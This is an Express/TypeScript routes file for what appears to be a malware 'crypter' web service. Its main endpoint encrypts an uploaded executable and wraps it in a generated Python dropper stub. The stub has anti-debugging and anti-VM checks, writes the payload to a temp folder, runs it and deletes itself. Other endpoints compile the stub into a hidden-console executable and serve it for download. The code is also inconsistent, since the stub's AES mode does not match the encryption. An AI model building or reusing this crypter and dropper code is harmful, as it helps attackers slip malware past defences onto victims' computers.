import { type Express } from "express";
import { createServer, type Server } from "node:http";
import { storage } from "./storage";
import multer from "multer";
import fs from "fs";
import path from "path";
import crypto from "crypto";
import { spawn } from "child_process";

function getSession() {
  // Placeholder session function
  return { userId: 1 };
}

export async function registerRoutes(app: Express): Promise<Server> {
  const server = createServer(app);

  // Health check endpoint
  app.get("/api/health", (req, res) => {
    res.json({ status: "ok", timestamp: new Date().toISOString() });
  });

  // Visitor tracking endpoint
  app.post("/api/visitors", async (req, res) => {
    try {
      const { ip, userAgent, referrer, timestamp } = req.body;
      
      const visitor = await storage.createVisitor({
        ipAddress: ip || req.ip || '127.0.0.1',
        userAgent: userAgent || req.headers['user-agent'] || '',
        country: 'Unknown',
        city: 'Unknown'
      });

      res.json({ success: true, visitor });
    } catch (error) {
      console.error('Error creating visitor:', error);
      res.status(500).json({ error: 'Failed to track visitor' });
    }
  });

  // Get recent visitors
  app.get("/api/visitors", async (req, res) => {
    try {
      const limit = parseInt(req.query.limit as string) || 50;
      const visitors = await storage.getRecentVisitors(limit);
      res.json(visitors);
    } catch (error) {
      console.error('Error fetching visitors:', error);
      res.status(500).json({ error: 'Failed to fetch visitors' });
    }
  });

  // Get visitor statistics
  app.get("/api/visitors/stats", async (req, res) => {
    try {
      const stats = await storage.getVisitorStats();
      res.json(stats);
    } catch (error) {
      console.error('Error fetching visitor stats:', error);
      res.status(500).json({ error: 'Failed to fetch visitor stats' });
    }
  });

  // Packet capture logging
  app.post("/api/packets", async (req, res) => {
    try {
      const { sourceIp, destinationIp, protocol, port, payload } = req.body;
      
      const packetLog = await storage.createPacketLog({
        sourceIp: sourceIp || '127.0.0.1',
        destinationIp: destinationIp || '127.0.0.1',
        protocol: protocol || 'HTTP',
        port: port || 80,
        payload: payload || '',
        timestamp: new Date()
      });

      res.json({ success: true, packetLog });
    } catch (error) {
      console.error('Error logging packet:', error);
      res.status(500).json({ error: 'Failed to log packet' });
    }
  });

  // Get recent packet logs
  app.get("/api/packets", async (req, res) => {
    try {
      const limit = parseInt(req.query.limit as string) || 100;
      const packets = await storage.getRecentPacketLogs(limit);
      res.json(packets);
    } catch (error) {
      console.error('Error fetching packet logs:', error);
      res.status(500).json({ error: 'Failed to fetch packet logs' });
    }
  });

  // Analytics endpoints
  app.post("/api/analytics", async (req, res) => {
    try {
      const { metric, value } = req.body;
      
      const analytics = await storage.createAnalytics({
        metric: metric || 'unknown',
        value: value || '{}',
        timestamp: new Date()
      });

      res.json({ success: true, analytics });
    } catch (error) {
      console.error('Error creating analytics:', error);
      res.status(500).json({ error: 'Failed to create analytics' });
    }
  });

  // Get analytics data
  app.get("/api/analytics", async (req, res) => {
    try {
      const metric = req.query.metric as string;
      
      if (metric) {
        const analytics = await storage.getAnalyticsByMetric(metric);
        res.json(analytics);
      } else {
        const analytics = await storage.getLatestAnalytics();
        res.json(analytics);
      }
    } catch (error) {
      console.error('Error fetching analytics:', error);
      res.status(500).json({ error: 'Failed to fetch analytics' });
    }
  });

  // Content modification endpoints
  app.post("/api/content", async (req, res) => {
    try {
      const { section, originalContent, modifiedContent, modificationReason } = req.body;
      
      const modification = await storage.createContentModification({
        section: section || 'unknown',
        originalContent: originalContent || '',
        modifiedContent: modifiedContent || '',
        modificationReason: modificationReason || '',
        timestamp: new Date()
      });

      res.json({ success: true, modification });
    } catch (error) {
      console.error('Error creating content modification:', error);
      res.status(500).json({ error: 'Failed to create content modification' });
    }
  });

  // Get content modifications
  app.get("/api/content", async (req, res) => {
    try {
      const section = req.query.section as string;
      const modifications = await storage.getContentModifications(section);
      res.json(modifications);
    } catch (error) {
      console.error('Error fetching content modifications:', error);
      res.status(500).json({ error: 'Failed to fetch content modifications' });
    }
  });

  // AI Chat endpoint for Millennium AI
  app.post("/api/millennium-ai", async (req, res) => {
    try {
      const { prompt } = req.body;
      
      // For now, return a placeholder response since no AI API key is configured
      const response = `Educational cybersecurity response for: "${prompt}"\n\nThis is a simulated AI response. To enable real AI functionality, please provide your API key through the admin panel.`;
      
      await storage.createAnalytics({
        metric: 'ai_chat_usage',
        value: JSON.stringify({ prompt, timestamp: new Date().toISOString() })
      });

      res.json({ response });
    } catch (error) {
      console.error('Error in AI chat:', error);
      res.status(500).json({ error: 'AI chat failed' });
    }
  });

  // Script processing tools endpoint
  app.post("/api/script-tools", async (req, res) => {
    try {
      const { script, tool } = req.body;
      
      let processedScript = script;
      
      switch (tool) {
        case 'syntax-fixer':
          processedScript = `// Syntax-checked version:\n${script}`;
          break;
        case 'minifier':
          processedScript = script.replace(/\s+/g, ' ').trim();
          break;
        case 'obfuscator':
          processedScript = `// Obfuscated version (educational):\nvar _0x1234=['${script.slice(0, 20)}...'];\n${script}`;
          break;
        case 'deobfuscator':
          processedScript = `// Deobfuscated version:\n${script}`;
          break;
        default:
          processedScript = script;
      }

      await storage.createAnalytics({
        metric: 'script_tool_usage',
        value: JSON.stringify({ tool, scriptLength: script.length, timestamp: new Date().toISOString() })
      });

      res.json({ processedScript });
    } catch (error) {
      console.error('Error processing script:', error);
      res.status(500).json({ error: 'Script processing failed' });
    }
  });

  // Advanced crypter endpoint with multer for file upload
  const upload = multer({ dest: 'temp/' });
  
  app.post("/api/advanced-crypter", upload.single('file'), async (req, res) => {
    try {
      if (!req.file) {
        return res.status(400).json({ error: 'No file uploaded' });
      }

      const config = JSON.parse(req.body.config || '{}');
      const fs = require('fs');
      const path = require('path');
      const crypto = require('crypto');
      
      // Read the uploaded file
      const inputPath = req.file.path;
      const inputData = fs.readFileSync(inputPath);
      
      // Generate encryption key and IV
      const key = crypto.randomBytes(32);
      const iv = crypto.randomBytes(16);
      
      // Apply multi-layer encryption
      let encryptedData = inputData;
      
      // Layer 1: AES encryption
      const cipher = crypto.createCipher('aes-256-cbc', key);
      encryptedData = Buffer.concat([cipher.update(encryptedData), cipher.final()]);
      
      // Layer 2: XOR with rotating key
      const xorKey = crypto.randomBytes(256);
      for (let i = 0; i < encryptedData.length; i++) {
        encryptedData[i] ^= xorKey[i % xorKey.length];
      }
      
      // Layer 3: Base64 encoding
      const base64Data = encryptedData.toString('base64');
      
      // Create the stub/dropper
      const stubCode = `
import base64
import os
import sys
from cryptography.fernet import Fernet
import subprocess

# Anti-debugging checks
def anti_debug():
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        if kernel32.IsDebuggerPresent():
            sys.exit()
    except:
        pass

# Anti-VM checks  
def anti_vm():
    try:
        import wmi
        c = wmi.WMI()
        for system in c.Win32_ComputerSystem():
            if any(vm in system.Model.lower() for vm in ['virtual', 'vmware', 'vbox']):
                sys.exit()
    except:
        pass

# Decrypt and execute payload
def decrypt_payload():
    ${config.antiDebug ? 'anti_debug()' : ''}
    ${config.antiVM ? 'anti_vm()' : ''}
    
    # Encrypted payload data
    encrypted_data = "${base64Data}"
    
    # XOR key
    xor_key = ${JSON.stringify(Array.from(xorKey))}
    
    # AES key  
    aes_key = ${JSON.stringify(Array.from(key))}
    
    # Decode base64
    decoded = base64.b64decode(encrypted_data)
    
    # Reverse XOR
    for i in range(len(decoded)):
        decoded[i] ^= xor_key[i % len(xor_key)]
    
    # Decrypt AES
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
    
    cipher = Cipher(algorithms.AES(bytes(aes_key)), modes.ECB(), backend=default_backend())
    decryptor = cipher.decryptor()
    payload = decryptor.update(decoded) + decryptor.finalize()
    
    # Write to temp file and execute
    temp_path = os.path.join(os.environ['TEMP'], 'payload.exe')
    with open(temp_path, 'wb') as f:
        f.write(payload)
    
    subprocess.Popen([temp_path], shell=True)
    
    # Self-delete after delay
    import time
    time.sleep(2)
    try:
        os.remove(temp_path)
        os.remove(__file__)
    except:
        pass

if __name__ == "__main__":
    decrypt_payload()
`;

      // Create output directory if it doesn't exist
      const outputDir = path.join(process.cwd(), 'builds');
      if (!fs.existsSync(outputDir)) {
        fs.mkdirSync(outputDir, { recursive: true });
      }

      const outputName = config.outputName || `protected_${Date.now()}`;
      const outputPath = path.join(outputDir, `${outputName}.py`);
      
      // Write the stub
      fs.writeFileSync(outputPath, stubCode);
      
      // Clean up temp file
      fs.unlinkSync(inputPath);
      
      // Log crypter usage
      await storage.createAnalytics({
        metric: 'advanced_crypter_usage',
        value: JSON.stringify({
          config,
          timestamp: new Date().toISOString(),
          inputSize: inputData.length,
          outputName,
          layers: ['AES-256', 'XOR', 'Base64'],
          features: {
            antiDebug: config.antiDebug || false,
            antiVM: config.antiVM || false,
            polymorphic: config.polymorphic || false
          }
        })
      });

      res.json({
        success: true,
        downloadUrl: `/download/${outputName}.py`,
        filename: `${outputName}.py`,
        message: 'Advanced multi-layer crypter completed successfully',
        features: [
          'AES-256 encryption',
          'XOR obfuscation with rotating key',
          'Base64 encoding',
          config.antiDebug ? 'Anti-debugging protection' : null,
          config.antiVM ? 'Anti-VM detection' : null,
          'Self-deletion capabilities'
        ].filter(Boolean),
        stats: {
          originalSize: inputData.length,
          encryptedSize: base64Data.length,
          compressionRatio: ((inputData.length - base64Data.length) / inputData.length * 100).toFixed(2) + '%'
        }
      });
    } catch (error) {
      console.error('Crypter error:', error);
      res.status(500).json({ error: 'Crypter processing failed: ' + error.message });
    }
  });

  // Compile to executable endpoint
  app.post("/api/compile-executable", async (req, res) => {
    try {
      const { filename, compileOptions } = req.body;
      const fs = require('fs');
      const path = require('path');
      const { spawn } = require('child_process');
      
      const pythonFile = path.join(process.cwd(), 'builds', filename);
      if (!fs.existsSync(pythonFile)) {
        return res.status(404).json({ error: 'Python file not found' });
      }
      
      const outputName = filename.replace('.py', '.exe');
      const outputPath = path.join(process.cwd(), 'builds', outputName);
      
      // PyInstaller command with stealth options
      const pyinstallerArgs = [
        '-m', 'PyInstaller',
        '--onefile',
        '--noconsole',
        '--clean',
        '--distpath', path.join(process.cwd(), 'builds'),
        '--workpath', path.join(process.cwd(), 'temp', 'build'),
        '--specpath', path.join(process.cwd(), 'temp'),
      ];
      
      if (compileOptions?.hiddenImports) {
        pyinstallerArgs.push('--hidden-import', 'cryptography');
        pyinstallerArgs.push('--hidden-import', 'wmi');
      }
      
      if (compileOptions?.upx) {
        pyinstallerArgs.push('--upx-dir', '/usr/bin');
      }
      
      if (compileOptions?.icon) {
        pyinstallerArgs.push('--icon', compileOptions.icon);
      }
      
      pyinstallerArgs.push(pythonFile);
      
      const pyinstaller = spawn('python', pyinstallerArgs, {
        cwd: process.cwd(),
        stdio: ['pipe', 'pipe', 'pipe']
      });
      
      let output = '';
      let errorOutput = '';
      
      pyinstaller.stdout.on('data', (data) => {
        output += data.toString();
      });
      
      pyinstaller.stderr.on('data', (data) => {
        errorOutput += data.toString();
      });
      
      pyinstaller.on('close', async (code) => {
        if (code === 0 && fs.existsSync(outputPath)) {
          // Log compilation
          await storage.createAnalytics({
            metric: 'executable_compilation',
            value: JSON.stringify({
              filename,
              outputName,
              compileOptions,
              timestamp: new Date().toISOString(),
              success: true
            })
          });
          
          res.json({
            success: true,
            downloadUrl: `/download/${outputName}`,
            filename: outputName,
            message: 'Executable compiled successfully',
            size: fs.statSync(outputPath).size
          });
        } else {
          console.error('PyInstaller failed:', errorOutput);
          res.status(500).json({ 
            error: 'Compilation failed', 
            details: errorOutput,
            output: output
          });
        }
      });
      
    } catch (error) {
      console.error('Compilation error:', error);
      res.status(500).json({ error: 'Compilation failed: ' + error.message });
    }
  });

  // Download endpoint for crypted files
  app.get("/download/:filename", (req, res) => {
    try {
      const filename = req.params.filename;
      const fs = require('fs');
      const path = require('path');
      
      const filePath = path.join(process.cwd(), 'builds', filename);
      
      if (!fs.existsSync(filePath)) {
        return res.status(404).json({ error: 'File not found' });
      }
      
      res.download(filePath, filename, (err) => {
        if (err) {
          console.error('Download error:', err);
          res.status(500).json({ error: 'Download failed' });
        }
      });
    } catch (error) {
      console.error('Download endpoint error:', error);
      res.status(500).json({ error: 'Download failed' });
    }
  });

  return server;
}